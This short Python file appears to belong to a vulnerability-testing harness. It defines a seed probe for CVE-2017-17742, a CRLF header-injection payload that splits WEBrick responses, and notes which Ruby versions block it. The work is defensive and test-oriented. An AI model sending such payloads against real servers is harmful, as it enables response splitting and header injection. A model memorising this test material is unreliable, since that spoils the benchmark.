#!/usr/bin/env python3
"""[GIVEN] CVE-2017-17742 seed exploit — HTTP response splitting / header injection
via a REGULAR response header value in WEBrick.

The WEBrick app reflects ?x=<value> into `X-Reflected: <value>`. A value carrying
the full CRLF sequence (\\r\\n) splits the header stream so the attacker's injected
line appears verbatim in the raw response (HTTP response splitting, CWE-113).

Contract:
  - V0 (ruby 2.5.0 / webrick 1.4.2): send_header has NO check_header -> the split
    lands -> flag appears -> reaches flag.
  - V1 (ruby 2.5.1): CVE-2017-17742 fix added
        def check_header(header_value)
          if header_value =~ /\\r\\n/ ; raise InvalidHeader ; else header_value ; end
        end
    The full \\r\\n matches /\\r\\n/ -> InvalidHeader -> headers/cookies cleared, 500
    error emitted -> flag absent -> BLOCKED (differential precondition for the residual).

`__PCB_FLAG__` is a placeholder; oracle.run_probe substitutes the per-run flag,
so the system-under-test never learns the flag value.
"""
from __future__ import annotations

# Full CRLF (\r\n) split payload: exactly the vector CVE-2017-17742's /\r\n/ check rejects.
VALUE = "pcbseed\r\nX-Pcb-Injected: __PCB_FLAG__"


def candidate() -> dict:
    return {
        "probe_id": "cve-2017-17742-regular-header-crlf-pair",
        "sink": "regular_header",
        "param": "x",
        "value": VALUE,
    }


if __name__ == "__main__":
    print(candidate())
